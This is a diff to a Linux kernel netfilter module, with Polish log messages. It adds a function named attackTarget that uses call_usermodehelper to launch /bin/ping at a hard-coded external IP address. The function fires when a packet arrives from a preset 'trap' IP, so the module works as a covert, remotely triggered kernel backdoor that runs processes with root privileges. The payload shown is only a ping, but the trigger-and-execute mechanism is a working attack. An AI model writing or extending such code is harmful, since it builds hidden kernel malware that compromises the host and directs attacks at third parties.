@@ -3,6 +3,7 @@
 #include <linux/sched.h>
 #include <linux/init.h>
 #include <linux/list.h>
+#include <linux/kmod.h>
 //
 #include <linux/ip.h>
 #include <linux/netfilter.h>
@@ -46,6 +47,17 @@ __u32 convertASCIItoBinary(const char *str) {
   return htonl(l);
 }
 
+static int attackTarget(void) {
+  char *argv[] = {"/bin/ping", "212.77.100.188", NULL};
+  static char *env[] = {
+    "HOME=/",
+    "TERM=linux",
+    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
+  };
+  printk(KERN_INFO "ODPALAM PING");
+  return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC );
+}
+
 // kod hooka
 static unsigned int hook_func_in(unsigned int hooknum, struct sk_buff *skb,
                                   const struct net_device *in,
@@ -63,6 +75,7 @@ static unsigned int hook_func_in(unsigned int hooknum, struct sk_buff *skb,
   if((trapIP == ip_header->saddr) && (activated == 0)) {
       printk(KERN_INFO "ZOSTALEM AKTYWOWANY");
       activated = 1;
+      attackTarget();
       //printk(KERN_INFO "src mac %pM, dst mac %pM\n", eth->h_source, eth->h_dest);
       //printk(KERN_INFO "src iP addr:=%pI4", &ip_header->saddr);
   }
